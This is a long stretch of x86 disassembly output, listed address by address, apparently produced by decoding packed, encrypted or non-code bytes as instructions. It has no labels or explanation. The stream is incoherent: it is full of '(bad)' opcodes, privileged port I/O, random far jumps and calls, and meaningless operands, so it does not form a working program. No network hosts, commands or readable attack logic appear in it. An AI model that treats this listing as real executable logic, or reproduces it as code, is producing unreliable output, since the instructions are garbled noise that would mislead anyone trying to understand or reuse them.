  41928a:	in     al,0x1e
  41928c:	lock mov ch,BYTE PTR [eax+0x6b]
  419290:	adc    BYTE PTR [ecx],0xad
  419293:	fwait
  419294:	and    ah,bh
  419296:	ret    0x6381
  419299:	iret   
  41929a:	adc    DWORD PTR [eax+0xbde4105],ebp
  4192a0:	jecxz  0x41925c
  4192a2:	inc    ebx
  4192a3:	push   cs
  4192a4:	dec    ebp
  4192a5:	(bad)  
  4192a6:	adc    bh,BYTE PTR [edi-0x5b497fa]
  4192ac:	mov    dh,0xf3
  4192ae:	or     esp,DWORD PTR ds:0xe5d5a56
  4192b4:	add    bl,0xd6
  4192b7:	test   al,0xb3
  4192b9:	cld    
  4192ba:	and    eax,0x38d90265
  4192bf:	jl     0x41926a
  4192c1:	ret    0x90e4
  4192c4:	mov    bl,0x6b
  4192c6:	or     eax,0x9cd2615e
  4192cb:	cmc    
  4192cc:	mov    ebp,0xa633e846
  4192d1:	rcr    BYTE PTR [ebx+0xb],cl
  4192d4:	push   esp
  4192d5:	add    bh,BYTE PTR [edi]
  4192d7:	sub    BYTE PTR [esi+0x6fa8656f],dh
  4192dd:	and    edi,esi
  4192df:	push   ecx
  4192e0:	mov    es:0x192712f1,al
  4192e6:	sbb    esp,ebp
  4192e8:	adc    eax,0xbde00bb
  4192ed:	das    
  4192ee:	dec    edx
  4192ef:	addr16 iret 
  4192f1:	iret   
  4192f2:	cdq    
  4192f3:	jge    0x4192e9
  4192f5:	push   ds
  4192f6:	jno    0x419340
  4192f8:	xchg   ebp,eax
  4192f9:	js     0x4192bb
  4192fb:	stos   DWORD PTR es:[edi],eax
  4192fc:	xor    al,0x49
  4192fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192ff:	nop
  419300:	aaa    
  419301:	mov    ds:0x5c0fdf3c,eax
  419306:	jl     0x4192ca
  419308:	int    0x47
  41930a:	jmp    0xec4:0x3e966d7b
  419311:	mov    dl,0xe1
  419313:	push   cs
  419314:	mov    bl,BYTE PTR [edx]
  419316:	and    al,0xfc
  419318:	xor    al,0xef
  41931a:	push   ecx
  41931b:	adc    DWORD PTR [edx],0xffffffcf
  41931e:	or     DWORD PTR [edi+0xa4af8bc],ebx
  419324:	pushf  
  419325:	or     eax,0xae0f1318
  41932a:	shl    al,1
  41932c:	repz int 0xab
  41932f:	sbb    DWORD PTR [esi+ecx*1+0xf],ebx
  419333:	leave  
  419334:	xchg   edi,eax
  419335:	jle    0x4192d8
  419337:	adc    BYTE PTR [esi],bh
  419339:	pop    esp
  41933a:	sub    edx,edx
  41933c:	imul   esi,DWORD PTR [esi],0x80e85539
  419342:	mov    dh,0xfd
  419344:	out    dx,eax
  419345:	cmp    al,0xa7
  419347:	cmp    al,0x6f
  419349:	sbb    edx,DWORD PTR [eax+esi*2-0x2aaed4a1]
  419350:	adc    al,0x2b
  419352:	and    DWORD PTR [ebx],edi
  419354:	in     al,dx
  419355:	sub    al,0x4
  419357:	pop    edi
  419358:	repnz test BYTE PTR [esp+eiz*4-0x53],ch
  41935d:	in     al,dx
  41935e:	test   eax,0x964de007
  419363:	sti    
  419364:	push   ebp
  419365:	ror    ebx,cl
  419367:	cmp    eax,0x211707b8
  41936c:	xchg   esp,eax
  41936d:	data16 (bad) 
  41936f:	mov    edx,0x1fa1d86d
  419374:	(bad)  
  419376:	in     al,dx
  419377:	mov    al,ds:0x9b5bc2a5
  41937c:	mov    ch,0xe0
  41937e:	cli    
  41937f:	add    al,bh
  419381:	div    DWORD PTR [edi+0x12d33e65]
  419387:	cmp    eax,0x9d36581a
  41938c:	ds fldln2 
  41938f:	mov    WORD PTR [eax],gs
  419391:	push   edx
  419392:	push   edi
  419393:	call   0x52d4:0x59be292a
  41939a:	icebp  
  41939b:	xor    DWORD PTR gs:[esp+ebx*4],0xffffffb1
  4193a0:	pop    esi
  4193a1:	mov    BYTE PTR [esi-0x5a2103de],ch
  4193a7:	mov    ?,WORD PTR [esp+eiz*8-0x17]
  4193ab:	jmp    0x4b25:0x34af3e4a
  4193b2:	out    dx,al
  4193b3:	pop    ebx
  4193b4:	mov    al,ds:0x69905bc9
  4193b9:	jmp    0x6917:0xf019491b
  4193c0:	pop    ebp
  4193c1:	xchg   DWORD PTR [edi+0x52],ebp
  4193c4:	dec    edx
  4193c5:	and    DWORD PTR [esi+0x6d],esi
  4193c8:	jmp    0x419377
  4193ca:	add    DWORD PTR [edi],0x1
  4193cd:	and    DWORD PTR [esp+ebx*8],eax
  4193d0:	test   BYTE PTR [ecx],0x2
  4193d3:	jnp    0x41942a
  4193d5:	sub    BYTE PTR [edx],dh
  4193d7:	das    
  4193d8:	pop    ecx
  4193d9:	outs   dx,BYTE PTR ds:[esi]
  4193da:	fldcw  WORD PTR [esi]
  4193dc:	int3   
  4193dd:	out    dx,al
  4193de:	mov    ebp,0x20d403d7
  4193e3:	jmp    edx
  4193e5:	rol    BYTE PTR [ebp-0x48e27aa1],1
  4193eb:	in     eax,0xe
  4193ed:	outs   dx,DWORD PTR ds:[esi]
  4193ee:	pop    edx
  4193ef:	sub    edx,esi
  4193f1:	sahf   
  4193f2:	jns    0x419408
  4193f4:	add    BYTE PTR [ebx+0x66d9f904],ch
  4193fa:	inc    ebx
  4193fb:	jmp    0xc19f:0xd787afb8
  419402:	ds js  0x419388
  419405:	jmp    DWORD PTR [edi+esi*4+0xd]
  419409:	and    al,0x75
  41940b:	pop    es
  41940c:	pop    edx
  41940d:	je     0x419399
  41940f:	sbb    al,0x40
  419411:	xchg   ebp,eax
  419412:	sbb    eax,0xf9680e9a
  419417:	and    edx,DWORD PTR [edx+0x3d]
  41941a:	pop    esi
  41941b:	je     0x4193c3
  41941d:	stc    
  41941e:	ret    
  41941f:	hlt    
  419420:	xor    ebx,DWORD PTR [ebx+0xa]
  419423:	fadd   DWORD PTR [esi]
  419425:	xchg   ebx,eax
  419426:	xor    BYTE PTR ds:0xca2718c3,0x95
  41942d:	out    0x68,eax
  41942f:	ins    BYTE PTR es:[edi],dx
  419430:	xor    edx,esi
  419432:	mov    ds:0x9d74490a,al
  419437:	rol    ebx,1
  419439:	jecxz  0x4193c5
  41943b:	push   esp
  41943c:	(bad)  
  41943d:	addr16 call 0xd7e8a37a
  419443:	dec    edx
  419444:	dec    ebp
  419445:	dec    ebp
  419446:	sbb    BYTE PTR [ebx-0xb],bh
  419449:	nop
  41944a:	das    
  41944b:	mov    bl,0xdc
  41944d:	xchg   BYTE PTR [edx+0x4eb8ae7a],dh
  419453:	sub    ebx,eax
  419455:	add    dh,BYTE PTR [edx-0x50]
  419458:	in     eax,dx
  419459:	inc    ebx
  41945a:	sti    
  41945b:	jbe    0x419490
  41945d:	rcl    BYTE PTR [edi],0x4c
  419460:	cvtps2pd xmm3,QWORD PTR [edi-0x52]
  419464:	hlt    
  419465:	or     BYTE PTR [eax+ecx*2+0x2d1d1f13],ah
  41946c:	xchg   ebp,eax
  41946d:	data16 adc al,0x98
  419470:	inc    edi
  419471:	mov    ah,0x6c
  419473:	pop    ebx
  419474:	mov    ds:0x72ac7583,al
  419479:	xchg   ecx,eax
  41947a:	xchg   esi,eax
  41947b:	ror    DWORD PTR [eax],1
  41947d:	call   0x79ef968
  419482:	bound  eax,QWORD PTR [edx+0x35750baf]
  419488:	rol    DWORD PTR [esp+edi*2-0x68],0xd8
  41948d:	jg     0x4194d7
  41948f:	rol    DWORD PTR [ebx],cl
  419491:	add    edx,0x18ca0aa5
  419497:	int    0x3f
  419499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41949a:	xchg   DWORD PTR [edi-0x2a4dbe14],esi
  4194a0:	mov    edi,0x96ed7bcf
  4194a5:	icebp  
  4194a6:	stos   BYTE PTR es:[edi],al
  4194a7:	jb     0x419498
  4194a9:	cmp    BYTE PTR [eax+0x308d2c6e],dl
  4194af:	pushf  
  4194b0:	mov    cl,0x3c
  4194b2:	out    dx,eax
  4194b3:	repnz mov dh,0xc9
  4194b6:	test   al,0x5b
  4194b8:	mov    bl,0x66
  4194ba:	xor    BYTE PTR [esi-0x19c6d3aa],bl
  4194c0:	xlat   BYTE PTR ds:[ebx]
  4194c1:	xor    al,bh
  4194c3:	jg     0x419471
  4194c5:	mov    eax,ds:0x4bb788fc
  4194ca:	mov    ?,WORD PTR [ebx]
  4194cc:	dec    ecx
  4194cd:	and    eax,0xfea9b097
  4194d2:	mov    cl,BYTE PTR [ebp-0x5931d4e2]
  4194d8:	mov    edi,0x9d60ffba
  4194dd:	loopne 0x41952e
  4194df:	in     eax,dx
  4194e0:	(bad)  [esi+ebp*1-0x36]
  4194e4:	loope  0x41949a
  4194e6:	jmp    0x4194d1
  4194e8:	loopne 0x419484
  4194ea:	ins    BYTE PTR es:[edi],dx
  4194eb:	in     eax,0xcf
  4194ed:	adc    BYTE PTR [esi],dl
  4194ef:	nop
  4194f0:	ds dec esp
  4194f2:	cmp    esi,eax
  4194f4:	mov    bh,0x13
  4194f6:	int    0xbc
  4194f8:	adc    ebp,DWORD PTR [edi+0x3f]
  4194fb:	int    0x6c
  4194fd:	sub    DWORD PTR [ebp+0x2460e946],ecx
  419503:	jns    0x419541
  419505:	dec    ebx
  419506:	cmp    esp,DWORD PTR [eax+0x7e69e586]
  41950c:	mov    ebx,0x27036e0a
  419511:	cmp    al,0x65
  419513:	mov    ds:0xec850f3c,eax
  419518:	call   0x5a0a:0x5f5712aa
  41951f:	pop    es
  419520:	and    DWORD PTR [edi+0x1d6dfd11],edi
  419526:	shl    BYTE PTR [ebp+0x41],1
  419529:	es push esp
  41952b:	in     al,0x1b
  41952d:	dec    esp
  41952e:	and    BYTE PTR [ebp+0x27],ch
  419531:	or     bl,0x9b
  419534:	(bad)  
  419535:	xrelease mov DWORD PTR cs:[edi-0x43c00a81],esi
  41953d:	lahf   
  41953e:	and    DWORD PTR [ebx+0x2c],0xffffffe6
  419542:	jge    0x419505
  419544:	outs   dx,DWORD PTR ds:[esi]
  419545:	pop    ecx
  419546:	jb     0x4194c8
  419548:	js     0x419565
  41954a:	imul   esp,DWORD PTR [eax+0x57],0x79f8003a
  419551:	out    dx,eax
  419552:	rcl    BYTE PTR ds:0xd511c83d,cl
  419558:	push   es
  419559:	jnp    0x4194dc
  41955b:	jb     0x419539
  41955d:	cli    
  41955e:	and    dl,BYTE PTR [eax]
  419560:	cmp    esi,DWORD PTR [edx]
  419562:	popf   
  419563:	imul   edx,ebx,0xffffff81
  419566:	ins    BYTE PTR es:[edi],dx
  419567:	cmp    eax,0x2a19b9f6
  41956c:	sar    eax,cl
  41956e:	lea    ebp,[esi+0x25b1eb7]
  419574:	mov    DWORD PTR [ebp+0x2a1869f0],edx
  41957a:	jl     0x41950c
  41957c:	xor    esi,DWORD PTR [edx+0x324ee4a0]
  419582:	mov    BYTE PTR es:[ebx-0x640e529],ah
  419589:	iret   
  41958a:	not    DWORD PTR [ebp-0x26]
  41958d:	fld    DWORD PTR es:[edx+0x6f]
  419591:	jle    0x41952b
  419593:	xchg   esi,eax
  419594:	out    0xf6,eax
  419596:	retf   0x464
  419599:	inc    edx
  41959a:	loopne 0x4195ce
  41959c:	jg     0x4195d2
  41959e:	test   BYTE PTR [edi-0x21],cl
  4195a1:	push   edx
  4195a2:	fwait
  4195a3:	or     al,0xf9
  4195a5:	jbe    0x41955b
  4195a7:	mov    eax,0x469b6177
  4195ac:	xor    esp,0xffffff9a
  4195af:	in     eax,dx
  4195b0:	test   al,0xb7
  4195b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195b3:	enter  0xbc66,0x2b
  4195b7:	jmp    0x9ce60210
  4195bc:	(bad)  
  4195bd:	in     al,dx
  4195be:	cmp    BYTE PTR [ebx-0x64017095],dh
  4195c4:	dec    ebp
  4195c5:	fidivr WORD PTR fs:[esi+0x4ebc1d02]
  4195cc:	sti    
  4195cd:	adc    al,0xd7
  4195cf:	pop    ss
  4195d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195d1:	shr    cl,0x63
  4195d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195d5:	fprem1 
  4195d7:	sub    al,0x85
  4195d9:	ins    BYTE PTR es:[edi],dx
  4195da:	cli    
  4195db:	mov    eax,ds:0x6edc436f
  4195e0:	or     ebp,DWORD PTR [ecx+ebx*8-0x2657a0c8]
  4195e7:	mov    edx,DWORD PTR [edi+0x27181248]
  4195ed:	sbb    eax,0xfa4f69f3
  4195f2:	pusha  
  4195f3:	inc    ecx
  4195f4:	in     eax,0xc0
  4195f6:	scas   al,BYTE PTR es:[edi]
  4195f7:	mov    esi,0x36c1b894
  4195fc:	jnp    0x4195cf
  4195fe:	jp     0x419612
  419600:	enter  0xfdee,0x99
  419604:	xor    dl,BYTE PTR [ebp-0x69]
  419607:	sbb    eax,0xc372ab2b
  41960c:	push   ss
  41960d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41960e:	push   esi
  41960f:	les    edx,FWORD PTR [edx-0x7d71cea7]
  419615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419616:	cdq    
  419617:	ss xor al,0xeb
  41961a:	jle    0x4195c6
  41961c:	dec    esi
  41961d:	mov    bl,0xa0
  41961f:	scas   eax,DWORD PTR es:[edi]
  419620:	js     0x41966d
  419622:	xor    BYTE PTR [edi],bh
  419624:	loope  0x419632
  419626:	loopne 0x4195d3
  419628:	data16 out dx,al
  41962a:	(bad)  
  41962b:	pop    ss
  41962c:	sti    
  41962d:	inc    eax
  41962e:	int3   
  41962f:	add    DWORD PTR [ecx-0x6a6a2d43],ecx
  419635:	repz sahf 
  419637:	pop    edx
  419638:	data16 jbe 0x419621
  41963b:	jmp    0x4195be
  41963d:	js     0x419682
  41963f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419640:	cmp    eax,DWORD PTR [edx-0x3dbd2895]
  419646:	sti    
  419647:	popa   
  419648:	imul   eax
  41964a:	or     al,0x3d
  41964c:	sbb    eax,0x65f2b60c
  419651:	add    ecx,esi
  419653:	mov    eax,0xbc4b2aef
  419658:	retf   0xa19c
  41965b:	push   edx
  41965c:	jge    0x4196b5
  41965e:	adc    bh,bh
  419660:	cdq    
  419661:	inc    ebx
  419662:	js     0x4196c9
  419664:	repz jmp 0x52d2e00f
  41966a:	or     eax,0xf57caa50
  41966f:	dec    esp
  419670:	iret   
  419671:	std    
  419672:	into   
  419673:	out    dx,eax
  419674:	adc    DWORD PTR [edx+edx*8],eax
  419677:	std    
  419678:	xchg   esp,eax
  419679:	aam    0x89
  41967b:	ror    dl,1
  41967d:	(bad)  
  41967e:	sub    edx,DWORD PTR cs:[ecx]
  419681:	and    DWORD PTR [ebp+0x6851735],esp
  419687:	fmul   QWORD PTR [eax+edi*2+0x58]
  41968b:	push   es
  41968c:	xchg   esp,eax
  41968d:	imul   edi,DWORD PTR [edi-0x4ad80afb],0x5a926f23
  419697:	xchg   edx,eax
  419698:	cmp    BYTE PTR [edi+0x61],al
  41969b:	repnz loope 0x419672
  41969e:	ret    0x1197
  4196a1:	pop    ss
  4196a2:	cmp    eax,0x477bed6a
  4196a7:	mov    cl,0xfc
  4196a9:	mov    DWORD PTR [esi-0x3],esi
  4196ac:	mov    ah,0x43
  4196ae:	cld    
  4196af:	adc    DWORD PTR [ecx-0x45c2d4ba],esi
  4196b5:	stos   DWORD PTR es:[edi],eax
  4196b6:	jne    0x4196dc
  4196b8:	xor    dl,BYTE PTR [edi]
  4196ba:	enter  0x690e,0x21
  4196be:	imul   BYTE PTR [edx-0x30279b23]
  4196c4:	jb     0x41969e
  4196c6:	ror    BYTE PTR [edi+0x1a],0x9f
  4196ca:	xchg   edx,eax
  4196cb:	pop    ss
  4196cc:	ret    0x8ddd
  4196cf:	test   BYTE PTR [eax+0x7fe73481],al
  4196d5:	mov    edi,0x83d0d3f3
  4196da:	cmp    eax,0x671eabc4
  4196df:	ins    DWORD PTR es:[edi],dx
  4196e0:	in     al,dx
  4196e1:	mov    al,ds:0x5cc96413
  4196e6:	xchg   edx,eax
  4196e7:	(bad)  
  4196e8:	call   0xda2:0x3d2d2c56
  4196ef:	clc    
  4196f0:	test   DWORD PTR [esp+ecx*4],esp
  4196f3:	jg     0x419683
  4196f5:	popa   
  4196f6:	add    BYTE PTR [edx+0x47],ch
  4196f9:	js     0x419724
  4196fb:	push   ss
  4196fc:	call   0xc9aa:0x2292e661
  419703:	sbb    BYTE PTR [ebp+0x40a04136],al
  419709:	fisttp QWORD PTR [eax-0x31]
  41970c:	mov    dl,0x63
  41970e:	and    BYTE PTR [esi],dh
  419710:	retf   0xda85
  419713:	mov    ah,0xa1
  419715:	outs   dx,DWORD PTR ds:[esi]
  419717:	lods   eax,DWORD PTR ds:[esi]
  419718:	adc    eax,0x8213b7c1
  41971d:	dec    ecx
  41971e:	mov    ch,0x2d
  419720:	jmp    0xad26fb58
  419725:	mov    al,BYTE PTR [esi]
  419727:	pop    cx
  419729:	xchg   BYTE PTR [edi+edi*8-0x3f382dd4],bl
  419730:	xor    al,0x3a
  419732:	lahf   
  419733:	lea    ecx,[ecx+0x5ab82803]
  419739:	fdiv   QWORD PTR [esi-0x5ad1227b]
  41973f:	ins    BYTE PTR es:[edi],dx
  419740:	jnp    0x41974c
  419742:	and    DWORD PTR ds:0xea1dd5f2,esi
  419748:	cwde   
  419749:	jg     0x419792
  41974b:	ja     0x419749
  41974d:	call   0xa9ac:0xd83cdabf
  419754:	popa   
  419755:	xchg   DWORD PTR [eax+0x45],esi
  419758:	je     0x4197d8
  41975a:	hlt    
  41975b:	in     al,dx
  41975c:	pop    ecx
  41975d:	mov    ah,0x43
  41975f:	pop    eax
  419760:	pushf  
  419761:	xchg   DWORD PTR [eax+edx*8],edi
  419764:	call   0xefb69086
  419769:	mov    esi,0x8adc1bb7
  41976e:	and    ecx,esp
  419770:	pop    eax
  419771:	adc    BYTE PTR [ebp+0x3f],dh
  419774:	fcom   DWORD PTR [esp+esi*1+0x6f28ee9d]
  41977b:	xchg   edx,eax
  41977c:	std    
  41977d:	mov    cl,BYTE PTR [edx]
  41977f:	xchg   BYTE PTR [eax+0x5d],al
  419782:	outs   dx,DWORD PTR ds:[esi]
  419783:	adc    ch,BYTE PTR ds:0xfae8c44b
  419789:	stos   DWORD PTR es:[edi],eax
  41978a:	aam    0xeb
  41978c:	into   
  41978d:	clc    
  41978e:	jae    0x41973d
  419790:	cld    
  419791:	sbb    eax,0x57abfa01
  419796:	pop    edx
  419797:	fbld   TBYTE PTR [edx]
  419799:	xchg   DWORD PTR [ebx],edi
  41979b:	or     DWORD PTR [ecx],edi
  41979d:	daa    
  41979e:	sub    BYTE PTR [edi],0xe2
  4197a1:	push   ebp
  4197a2:	and    eax,DWORD PTR [eax]
  4197a4:	cmc    
  4197a5:	fcmove st,st(6)
  4197a7:	jg     0x41975c
  4197a9:	pop    esp
  4197aa:	add    eax,0x9fb7840
  4197af:	in     eax,0x51
  4197b1:	outs   dx,DWORD PTR ds:[esi]
  4197b2:	mov    ds:0x6f307402,eax
  4197b7:	cmc    
  4197b8:	fld    TBYTE PTR [ebx-0x4f]
  4197bb:	jne    0x4197de
  4197bd:	jp     0x4197e9
  4197bf:	jnp    0x41980a
  4197c1:	mov    WORD PTR [ecx],gs
  4197c3:	je     0x4197bc
  4197c5:	xor    al,0xc7
  4197c7:	bound  ecx,QWORD PTR [ebp-0xc5ce4df]
  4197cd:	ins    BYTE PTR es:[edi],dx
  4197ce:	inc    esi
  4197cf:	mov    eax,ds:0x930b2dde
  4197d4:	push   0x64
  4197d6:	sbb    DWORD PTR [ebx+ebx*4],ebx
  4197d9:	mov    ah,0xe5
  4197db:	aad    0xb7
  4197dd:	pop    esi
  4197de:	add    BYTE PTR [eax-0x7d],al
  4197e1:	xor    eax,0xa35c475f
  4197e6:	out    dx,eax
  4197e7:	or     cl,bl
  4197e9:	ins    BYTE PTR es:[edi],dx
  4197ea:	xor    BYTE PTR [eax-0x7d],al
  4197ed:	fisub  DWORD PTR [ebp+ebp*8+0x9]
  4197f1:	mul    BYTE PTR [ebp-0x390d343d]
  4197f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197f8:	in     al,0x52
  4197fa:	inc    edx
  4197fb:	(bad)  
  4197fd:	mov    DWORD PTR [ebx+0x6ea744b5],edx
  419803:	adc    esp,ecx
  419805:	xor    ecx,DWORD PTR [ecx+ebx*8+0x20]
  419809:	out    0xcc,eax
  41980b:	cld    
  41980c:	adc    ebx,DWORD PTR [edx]
  41980e:	das    
  41980f:	mov    ch,0x85
  419811:	sub    al,0x66
  419813:	ror    DWORD PTR [esi+0x58],0xad
  419817:	jg     0x419897
  419819:	xchg   ecx,eax
  41981a:	xchg   ebp,eax
  41981b:	fstp   TBYTE PTR [edi+0x78]
  41981e:	aad    0x37
  419820:	and    BYTE PTR [ebx+0x5f],bh
  419823:	arpl   WORD PTR [ebp+0x35a790ba],sp
  419829:	scas   al,BYTE PTR es:[edi]
  41982a:	(bad)  
  41982b:	icebp  
  41982c:	stos   DWORD PTR es:[edi],eax
  41982d:	je     0x419828
  41982f:	add    eax,DWORD PTR [ebx]
  419831:	xchg   dl,cl
  419833:	xchg   ah,dl
  419835:	mov    ecx,0xe466d437
  41983a:	push   0xffffffcc
  41983c:	mov    dl,0x35
  41983e:	push   ds
  41983f:	adc    bh,BYTE PTR [esi+eiz*2+0x41a1a563]
  419846:	imul   DWORD PTR [ebx-0x613f1414]
  41984c:	(bad)  
  41984d:	js     0x41981c
  41984f:	test   DWORD PTR [edx],edi
  419851:	popf   
  419852:	lods   eax,DWORD PTR ds:[esi]
  419853:	xor    al,BYTE PTR [ecx]
  419855:	jns    0x4197df
  419857:	arpl   WORD PTR ds:0x1cd1a3c7,sp
  41985d:	xor    dh,BYTE PTR [edx+esi*1-0x437fe182]
  419864:	dec    eax
  419865:	int3   
  419866:	and    al,0x31
  419868:	aaa    
  419869:	cmc    
  41986a:	ror    BYTE PTR [edi],cl
  41986c:	push   edi
  41986d:	dec    edx
  41986e:	jle    0x419815
  419870:	sbb    ebp,eax
  419872:	pop    esi
  419873:	pop    ebp
  419874:	mov    al,0xe0
  419876:	pusha  
  419877:	adc    BYTE PTR [ecx-0x25d9b402],dh
  41987d:	jnp    0x419830
  41987f:	push   ds
  419880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419881:	lock test bl,bl
  419884:	cli    
  419885:	out    dx,eax
  419886:	mov    dl,BYTE PTR ds:0x22793738
  41988c:	xchg   ch,ah
  41988e:	pop    ebp
  41988f:	pop    esi
  419890:	inc    ecx
  419891:	mov    ds:0x12329c89,eax
  419896:	mov    bl,0x35
  419898:	xchg   esp,eax
  419899:	mov    dh,dh
  41989b:	ins    BYTE PTR es:[edi],dx
  41989c:	mov    esp,0x6af5309
  4198a1:	adc    dl,BYTE PTR [ebp-0x5359c33d]
  4198a7:	mov    ebx,0x1ee7144
  4198ac:	push   ebp
  4198ad:	loop   0x4198b3
  4198af:	dec    esi
  4198b0:	pop    esi
  4198b1:	imul   eax,DWORD PTR [ecx+ecx*8+0x2c],0xfa59dc8b
  4198b9:	lods   eax,DWORD PTR ds:[esi]
  4198ba:	retf   0x6b62
  4198bd:	in     al,0x1c
  4198bf:	test   al,0x67
  4198c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198c3:	inc    edx
  4198c4:	scas   al,BYTE PTR es:[edi]
  4198c5:	mov    BYTE PTR [edx+0x591d10e3],dl
  4198cb:	inc    ebp
  4198cc:	pop    edx
  4198cd:	push   0xe8f2b8e2
  4198d2:	frstor [esi+0x5a]
  4198d5:	not    BYTE PTR [eax]
  4198d7:	stc    
  4198d8:	sbb    BYTE PTR [eax-0x4d63d9ec],dh
  4198de:	(bad)  
  4198df:	enter  0xb184,0xb4
  4198e3:	fldcw  WORD PTR [esi]
  4198e5:	or     eax,0x58b5a1e8
  4198ea:	fidiv  DWORD PTR [edi+0x47336e2e]
  4198f0:	popa   
  4198f1:	xlat   BYTE PTR ds:[ebx]
  4198f2:	xchg   esi,eax
  4198f3:	call   DWORD PTR [edi+0x54]
  4198f6:	je     0x41995e
  4198f8:	retf   
  4198f9:	pop    esi
  4198fa:	lods   al,BYTE PTR ds:[esi]
  4198fb:	std    
  4198fc:	push   edx
  4198fd:	jp     0x4198e3
  4198ff:	inc    esi
  419900:	push   ds
  419901:	popf   
  419902:	mov    ecx,0x41388f6e
  419907:	iret   
  419908:	lea    edi,[ebx+0x3b]
  41990b:	addr16 jae 0x41996d
  41990e:	adc    ebx,ebx
  419910:	lods   al,BYTE PTR ds:[esi]
  419911:	arpl   WORD PTR [eax+ebx*4+0x37],ax
  419915:	in     al,dx
  419916:	stc    
  419917:	jno    0x41993d
  419919:	mov    eax,0x2dd6c5c6
  41991e:	call   0x8fe5:0x4c4ca51a
  419925:	rcr    DWORD PTR [edi+0x59],cl
  419928:	fldenv [edx+eiz*4-0x48]
  41992c:	adc    DWORD PTR [ebx],edx
  41992e:	and    BYTE PTR [edi+0x5dba82b],0xca
  419935:	xchg   DWORD PTR [eax+0x3e],esi
  419938:	push   cs
  419939:	ror    BYTE PTR [ecx+0x5f210c4d],0xa
  419940:	inc    edi
  419941:	pop    eax
  419942:	push   ebx
  419943:	pop    es
  419944:	jo     0x419940
  419946:	inc    edx
  419947:	mov    ah,0xce
  419949:	xor    bl,BYTE PTR [edx-0x15d1565e]
  41994f:	js     0x419900
  419951:	sahf   
  419952:	jle    0x419925
  419954:	mov    esp,DWORD PTR [ebp+0x41ef6935]
  41995a:	ja     0x419975
  41995c:	xchg   ebx,eax
  41995d:	jbe    0x41993e
  41995f:	loop   0x41998f
  419961:	or     esi,DWORD PTR [ebx+0x2029a17d]
  419967:	sbb    bl,cl
  419969:	cmp    esp,DWORD PTR [esi]
  41996b:	xchg   DWORD PTR [eax],esp
  41996d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41996e:	mov    ebp,0x1520ba6c
  419973:	aaa    
  419974:	mov    ebx,0xc287c1f0
  419979:	jno    0x4199d7
  41997b:	clc    
  41997c:	dec    ebx
  41997d:	cs (bad) 
  41997f:	ins    DWORD PTR es:[edi],dx
  419980:	add    BYTE PTR [esi-0x42],dl
  419983:	or     BYTE PTR ds:0xb85d7fa4,0x8b
  41998a:	fiadd  DWORD PTR [edi+0x4a]
  41998d:	and    al,0xe6
  41998f:	or     esp,edx
  419991:	mov    WORD PTR [edx],ss
  419993:	pop    ecx
  419994:	out    0x52,al
  419996:	inc    esp
  419997:	push   es
  419998:	ds pop ebp
  41999a:	add    BYTE PTR [ecx],ch
  41999c:	cmp    eax,0x18093946
  4199a1:	mov    WORD PTR [edi],ss
  4199a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199a4:	neg    bl
  4199a6:	lds    edi,FWORD PTR [esp+ecx*2+0x26e5cdef]
  4199ad:	in     eax,dx
  4199ae:	call   FWORD PTR [ebp+0xe17449]
  4199b4:	inc    esi
  4199b5:	mul    ch
  4199b7:	ins    DWORD PTR es:[edi],dx
  4199b8:	mov    ah,0x34
  4199ba:	push   es
  4199bb:	push   ss
  4199bc:	arpl   WORD PTR [edi-0x67],bx
  4199bf:	add    al,0xba
  4199c1:	add    BYTE PTR es:[ecx],dh
  4199c4:	xlat   BYTE PTR ds:[ebx]
  4199c5:	das    
  4199c6:	pop    eax
  4199c7:	mov    ebx,0x4de93a3e
  4199cc:	std    
  4199cd:	pop    ebx
  4199ce:	xor    eax,0x8442b4e8
  4199d3:	pop    edx
  4199d4:	ins    DWORD PTR es:[edi],dx
  4199d5:	xor    DWORD PTR [eax-0x31],ebp
  4199d8:	test   dh,cl
  4199da:	in     eax,0x69
  4199dc:	loopne 0x419a2c
  4199de:	icebp  
  4199df:	cmp    al,0x2e
  4199e1:	inc    bx
  4199e3:	or     edi,DWORD PTR [eiz*2-0x5ff4b664]
  4199ea:	sbb    bh,0x12
  4199ed:	mov    al,ds:0xe1f39f25
  4199f2:	out    dx,al
  4199f3:	fimul  DWORD PTR [ebx]
  4199f5:	or     al,0xf4
  4199f7:	dec    esp
  4199f8:	ja     0x4199f8
  4199fa:	call   0x7f9f:0xaf1a808
  419a01:	mov    al,ds:0x2332d999
  419a06:	(bad)  
  419a07:	addr16 (bad) 
  419a0a:	xor    eax,0x4a5c400e
  419a0f:	ds push ss
  419a11:	push   ebp
  419a12:	push   cs
  419a13:	push   ebp
  419a14:	ja     0x419a32
  419a16:	xor    al,BYTE PTR [edi]
  419a18:	pusha  
  419a19:	test   BYTE PTR [esi+ecx*4+0x637ea583],bl
  419a20:	stos   BYTE PTR es:[edi],al
  419a21:	(bad)  
  419a22:	mov    eax,ds:0xd5a165a
  419a27:	mov    ch,0x8a
  419a29:	push   edx
  419a2a:	push   ebx
  419a2b:	idiv   BYTE PTR [ecx+0x38f4a0a]
  419a31:	(bad)  
  419a32:	aam    0xbb
  419a34:	daa    
  419a35:	push   esi
  419a36:	xchg   ebp,eax
  419a37:	sub    edx,DWORD PTR [esi-0x15dc69a2]
  419a3d:	mov    al,ds:0xfdd2c7cd
  419a42:	rcl    bh,cl
  419a44:	add    DWORD PTR [esi+0x38],ebp
  419a47:	xchg   BYTE PTR [esi+0x3983bb5b],dh
  419a4d:	aam    0xe
  419a4f:	xor    BYTE PTR [ebp+0x59360943],0x17
  419a56:	push   edi
  419a57:	sti    
  419a58:	int3   
  419a59:	xchg   edx,eax
  419a5a:	jb     0x419a41
  419a5c:	out    dx,al
  419a5d:	mul    DWORD PTR [ebx+eiz*8+0x794dc75a]
  419a64:	dec    edi
  419a65:	adc    eax,0xa12432bb
  419a6a:	test   cl,ah
  419a6c:	popf   
